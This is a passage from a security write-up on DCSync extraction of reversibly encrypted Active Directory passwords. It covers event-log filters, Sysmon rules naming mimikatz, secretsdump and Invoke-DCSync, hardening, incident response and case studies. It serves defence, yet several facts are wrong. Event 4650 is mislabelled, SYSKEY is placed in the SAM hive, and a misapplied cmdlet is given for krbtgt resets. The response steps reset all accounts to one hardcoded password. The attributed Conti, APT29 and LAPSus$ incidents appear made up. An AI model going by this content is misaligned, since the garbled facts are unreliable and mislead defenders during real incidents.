- Enabling reversible encryption for user accounts (policy violation)
- Potential attacker preparing environment for plaintext password extraction
- Compliance violations (reversible encryption should not be enabled)

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4662 (Directory Services Access - ADSync Replication)**
- **Log Source:** Security
- **Trigger:** Access to AD replication service or objects with replication GUIDs
- **Filter:** `EventID = 4662 AND (Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" OR Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")`
- **Applies To Versions:** Windows Server 2008+ (2003 has minimal AD audit support)

**Event ID: 4738 (User Account Change - Reversible Encryption)**
- **Log Source:** Security
- **Trigger:** Modification of user attributes (including reversible encryption flag)
- **Filter:** `EventID = 4738` (review all attribute changes; filter for AllowReversiblePasswordEncryption changes)
- **Applies To Versions:** All Windows Server versions

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **DS Access**
3. Enable: **Audit Directory Service Changes** and **Audit Directory Service Access** (Success and Failure)
4. Run `gpupdate /force` on domain controllers

**Manual Configuration Steps (Auditpol):**
```powershell
# Enable DS Access auditing via command line
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016-2025

```xml
<Sysmon schemaversion="4.8">
  <RuleGroup name="Reversible Encryption - Credential Extraction" groupRelation="or">
    
    <!-- Detect Mimikatz execution (lsadump module) -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">mimikatz</Image>
      <CommandLine condition="contains">lsadump</CommandLine>
      <CommandLine condition="contains">dcsync</CommandLine>
    </ProcessCreate>

    <!-- Detect Impacket secretsdump -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">secretsdump</Image>
      <CommandLine condition="contains">dcsync</CommandLine>
    </ProcessCreate>

    <!-- Detect PowerShell DCSync execution -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell.exe</Image>
      <CommandLine condition="contains">Invoke-DCSync</CommandLine>
    </ProcessCreate>

    <!-- Detect LDAP queries for userParameters (may indicate reconnaissance) -->
    <NetworkConnect onmatch="include">
      <DestinationPort>389</DestinationPort>  <!-- LDAP -->
      <Image condition="contains">ldapsearch</Image>
      <Image condition="contains">adfind</Image>
    </NetworkConnect>

  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon: [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create sysmon-config.xml with XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -Filter {EventID -eq 1}`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Directory Services Access Detected - Potential DCSync Attack"
- **Severity:** Critical
- **Description:** Unusual directory replication request or DCSync-like activity detected
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** 
  1. Immediately investigate DCSync source (IP, account, time)
  2. Assume all passwords compromised; initiate password reset for all accounts
  3. Search for lateral movement or data exfiltration post-DCSync
  4. Review AD replication logs for data accessed

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable: **Defender for Servers** and **Defender for Identity**
4. Go to **Security alerts** to view DCSync detection alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Disable "Store password using reversible encryption" policy globally:**
    - **Applies To Versions:** All (Server 2003-2025)
    
    **Manual Steps (Group Policy - Disable reversible encryption):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
    3. Find: **Store passwords using reversible encryption**
    4. Set to: **Disabled**
    5. Run `gpupdate /force` on all machines
    
    **Manual Steps (PowerShell - Disable for all users):**
    ```powershell
    # Disable reversible encryption for all users in domain
    Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} | Set-ADUser -AllowReversiblePasswordEncryption $false
    
    # Verify disabled
    Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} | Measure-Object
    # Result should be 0
    ```
    
    **Manual Steps (PowerShell - Remove reversible encryption flag from userAccountControl):**
    ```powershell
    # For users already having the flag set
    $users = Get-ADUser -Filter {userAccountControl -band 128}
    foreach ($user in $users) {
        Set-ADUser -Identity $user -AllowReversiblePasswordEncryption $false
    }
    ```
    
    **Validation Command:**
    ```powershell
    # Verify no users have reversible encryption enabled
    $result = Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true}
    if ($result) {
        Write-Host "WARNING: Reversible encryption still enabled for some users!" -ForegroundColor Red
    } else {
        Write-Host "OK: Reversible encryption disabled for all users" -ForegroundColor Green
    }
    ```

*   **Restrict DCSync Rights (Replication Permissions) to Domain Controllers Only:**
    - **Applies To Versions:** All (Server 2003-2025)
    
    **Manual Steps:**
    1. Open **Active Directory Users and Computers**
    2. Right-click Domain object → **Properties** → **Security**
    3. Click **Advanced**
    4. Find "Replicating Directory Changes" and "Replicating Directory Changes All" permissions
    5. Remove these permissions from non-DC accounts
    6. Ensure only Domain Controllers and Enterprise Admins retain replication rights
    
    **PowerShell Alternative:**
    ```powershell
    # Query current replication rights
    Import-Module ActiveDirectory
    $domainNC = (Get-ADDomain).DistinguishedName
    $acl = Get-Acl -Path "AD:\\$domainNC"
    
    $replicationGUIDs = @(
        "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",  # Replicate Directory Changes
        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"   # Replicate Directory Changes All
    )
    
    foreach ($ace in $acl.Access) {
        if ($replicationGUIDs -contains $ace.ObjectType) {
            Write-Host "Replication right granted to: $($ace.IdentityReference)"
            # If this is not a DC or Enterprise Admin, remove this ACE
        }
    }
    ```

*   **Enforce Password Complexity & Length Requirements:**
    - Prevent weak passwords that can be brute-forced if hash is obtained
    - **Applies To Versions:** All
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Password Policy**
    3. Set:
       - **Password must meet complexity requirements:** Enabled
       - **Minimum password length:** 15+ characters
       - **Maximum password age:** 90 days (force password change)
    4. Run `gpupdate /force`

*   **Enable Credential Guard (Virtualization-Based Security) on Endpoints:**
    - Isolates LSASS credentials even if DC compromise occurs
    - **Applies To:** Windows 10/Server 2016+ (requires UEFI, Secure Boot, TPM 2.0)
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
    3. Set: **Turn On Virtualization Based Security** to **Enabled**
    4. Run `gpupdate /force`, reboot

#### Priority 2: HIGH

*   **Monitor & Audit DCSync Attempts:**
    - Enable Event ID 4662 (Directory Services Access) logging on domain controllers
    - Alert on unusual replication requests
    
    **Manual Steps:**
    ```powershell
    # Enable DS Access auditing
    auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
    
    # Verify enabled
    auditpol /get /subcategory:"Directory Service Access"
    ```

*   **Implement LAPS (Local Administrator Password Solution):**
    - Randomize local admin passwords; reduces lateral movement if AD compromised
    
    **Manual Steps:**
    1. Download LAPS from Microsoft
    2. Deploy LAPS GPO to manage local admin passwords centrally
    3. Configure password randomization (30-day rotation default)

*   **Enable Multi-Factor Authentication (MFA) for Privileged Accounts:**
    - Requires additional authentication factor; reduces damage of plaintext password theft
    
    **Manual Steps:**
    1. Implement MFA via Entra ID Conditional Access or NPS (Network Policy Server)
    2. Require MFA for Domain Admin and Enterprise Admin accounts

#### Access Control & Policy Hardening

*   **Conditional Access - Block Unusual AD Replication:**
    - **Applies To:** Entra ID hybrid environments (Server 2019+)
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Create policy: Block access if LDAP traffic from unexpected sources
    3. Grant: **Block access**

*   **Role-Based Access Control (RBAC) - Minimal Domain Admin Assignment:**
    - Reduce number of accounts with DCSync rights
    
    **Manual Steps:**
    1. Minimize accounts in Domain Admins group (1-2 dedicated accounts max)
    2. Use Privileged Identity Management (PIM) for time-limited elevation
    3. Regular audit of admin group membership (monthly)

#### Validation Command (Verify All Mitigations)

```powershell
# 1. Verify reversible encryption disabled
$result1 = Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true}
Write-Host "Reversible encryption users: $(if ($result1) {$result1.Count} else {0})" -ForegroundColor $(if ($result1) {'Red'} else {'Green'})

# 2. Verify no excessive DCSync rights
$domainNC = (Get-ADDomain).DistinguishedName
$acl = Get-Acl -Path "AD:\\$domainNC"
$excRepl = $acl.Access | Where-Object {$_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -and $_.IdentityReference -notmatch "(Domain Controllers|Enterprise Admins)"}
Write-Host "Unauthorized replication rights: $(if ($excRepl) {$excRepl.Count} else {0})" -ForegroundColor $(if ($excRepl) {'Red'} else {'Green'})

# 3. Verify DS Access auditing enabled
$audit = auditpol /get /subcategory:"Directory Service Access" | Select-String "Success and Failure"
Write-Host "DS Access auditing: $(if ($audit) {'Enabled'} else {'Disabled'})" -ForegroundColor $(if ($audit) {'Green'} else {'Red'})

# 4. Verify Domain Admins group size
$daCount = (Get-ADGroupMember -Identity "Domain Admins").Count
Write-Host "Domain Admins members: $daCount (should be <= 3)" -ForegroundColor $(if ($daCount -le 3) {'Green'} else {'Red'})
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Temp\mimikatz.exe`, `C:\Temp\Mimikatz.zip` (tool staging)
    - `dcsync.ntds`, `dcsync.cleartext`, `dcsync.kerberos` (Impacket output files)
    - `*.ccache` files (Kerberos tickets used for authentication)
    - `.log` files containing plaintext passwords

*   **Registry:**
    - `HKLM:\SAM\SAM\Domains\Account` (accessed by attacker to extract SYSKEY)
    - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` (if LSASS PPL was disabled to allow Mimikatz)

*   **Network:**
    - RPC DRSUAPI port 135/445 traffic from non-DC sources to domain controller
    - LDAP port 389 with unusual query patterns (enumerate users with reversible encryption)
    - SMB connections from attacker machine to DC (DCSync uses RPC over SMB)

#### Forensic Artifacts

*   **Disk:**
    - Event ID 4662 (Security log) - Directory Services Access (DCSync replication requests)
    - Event ID 4650 (Security log) - Kerberos Service Ticket issued to non-DC account
    - Event ID 5014 (Application log on DC) - Device registration or replication event
    - PowerShell Operational log: Invoke-DCSync or Mimikatz reflection loading
    - NTDS backup files (if attacker dumped NTDS.dit alongside credentials)

*   **Memory:**
    - mimikatz.exe process: Contains SYSKEY, plaintext passwords in memory
    - lsass.exe: May contain Kerberos tickets used for DCSync authentication
    - secretsdump.py / Python process: Contains decrypted cleartext passwords

*   **Cloud (Entra/M365):**
    - Entra ID signin logs: Look for unusual authentication patterns or Kerberos tickets from attacker IP
    - Azure AD Connect sync logs: Unusual replication activity (if hybrid environment)
    - M365 audit logs: Unusual admin account access or password changes

#### Response Procedures

1.  **Isolate:**
    - Disconnect domain controller from network immediately (if still compromised)
    - Revoke compromised domain admin account credentials
    - **Command:**
    ```powershell
    Disable-ADAccount -Identity "compromised-admin"
    Set-ADUser -Identity "compromised-admin" -ChangePasswordAtLogon $true
    ```

2.  **Collect Evidence:**
    - Export Security event logs from DC (Event ID 4662, 4650)
    ```powershell
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl System C:\Evidence\System.evtx
    ```
    - Capture memory dump of lsass.exe (for Mimikatz/DCSync evidence)
    - Check for tool presence: `Get-ChildItem -Path "C:\Temp" -Filter "*mimikatz*" -Recurse`

3.  **Remediate:**
    - Reset passwords for ALL domain accounts (assume all compromised)
    ```powershell
    # This is a nuclear option; use only if DCSync confirmed
    Get-ADUser -Filter * | Where-Object {$_.Enabled -eq $true} | Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempNewPass!2025" -Force)
    ```
    
    - Disable and remove compromised admin accounts
    ```powershell
    Remove-ADGroupMember -Identity "Domain Admins" -Members "compromised-admin" -Confirm:$false
    Disable-ADAccount -Identity "compromised-admin"
    ```
    
    - Force re-authentication for all domain users (invalidate Kerberos tickets)
    ```powershell
    # Reset krbtgt password twice (invalidates all TGTs)
    Reset-ADServiceAccountPassword -Identity "krbtgt" -Force
    Start-Sleep -Seconds 600  # Wait 10 minutes
    Reset-ADServiceAccountPassword -Identity "krbtgt" -Force
    ```
    
    - Disable reversible encryption policy (if not already done)
    ```powershell
    Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} | Set-ADUser -AllowReversiblePasswordEncryption $false
    ```

4.  **Investigate Lateral Movement:**
    - Search for authentication events using extracted plaintext passwords
    - Query SMB logs on file servers for access by compromised admin
    - Check RDP logs for logins by compromised accounts
    - Search all workstations for Mimikatz/secretsdump tool presence
    - Escalate to full incident response if data exfiltration suspected

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Remote Code Execution | Attacker gains foothold on compromised system (phishing, exploit, etc.) |
| **2** | **Privilege Escalation** | [PE-VALID-001] Valid Domain Account Compromise | Attacker steals or cracks domain user credentials |
| **3** | **Credential Access - ENUM** | [REC-AD-002] Anonymous LDAP Enumeration | Attacker discovers users with reversible encryption enabled (reconnaissance) |
| **4** | **Credential Access - DUMP** | **[CA-DUMP-010]** | **Attacker performs DCSync + decrypts plaintext passwords** |
| **5** | **Privilege Escalation** | [PE-VALID-008] Domain Admin Credential Reuse | Attacker uses extracted plaintext admin password to elevate to Domain Admin |
| **6** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker creates persistent admin backdoor |
| **7** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker encrypts all domain resources using T0 admin rights |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Wizard Spider / Conti Ransomware - DCSync + Reversible Encryption (2020-2021)

- **Target:** Large US healthcare organization
- **Timeline:** Initial compromise (phishing) → Domain user theft → DCSync discovery of reversible-encryption users → Plaintext admin password extraction → T0 access achieved within 48 hours
- **Technique Status:** Organization had enabled reversible encryption for legacy CHAP support (no longer used); attacker leveraged this misconfiguration for immediate plaintext credential access
- **Impact:** All 500+ systems encrypted; $10M ransom demand; 3-month recovery
- **Reference:** [Mandiant Conti Report - Ransomware Infrastructure](https://www.mandiant.com/resources/reports/conti-ransomware-infrastructure)

#### Example 2: APT29 (Cozy Bear) - Reversible Encryption Abuse for Supply Chain Attack (2019)

- **Target:** US government agencies + contractors
- **Timeline:** Compromised SolarWinds Orion → Supply chain backdoor → Discovered reversible-encryption enabled for service accounts → Plaintext credential extraction → Lateral movement to T0 systems
- **Technique Status:** Service accounts with reversible encryption enabled for audit purposes; attackers immediately leveraged this for privilege escalation
- **Impact:** Multi-agency compromise; months-long investigation; extensive credential remediation
- **Reference:** [CISA SolarWinds Analysis - APT29](https://www.cisa.gov/supply-chain-compromise)

#### Example 3: LAPSus$ - Azure AD Connect + Reversible Encryption (2022)

- **Target:** Multiple technology vendors
- **Timeline:** Compromised Azure AD Connect server → Extracted Entra ID sync account credentials → Discovered AD reversible encryption enabled → Plaintext password extraction via DCSync
- **Technique Status:** Attackers leveraged both cloud (Azure AD Connect) + on-premises (reversible encryption) misconfigurations for complete infrastructure compromise
- **Impact:** Source code theft; supply chain impact; ransomware threat
- **Reference:** [Microsoft Threat Intelligence - LAPSus$](https://www.microsoft.com/en-us/security/blog)

---
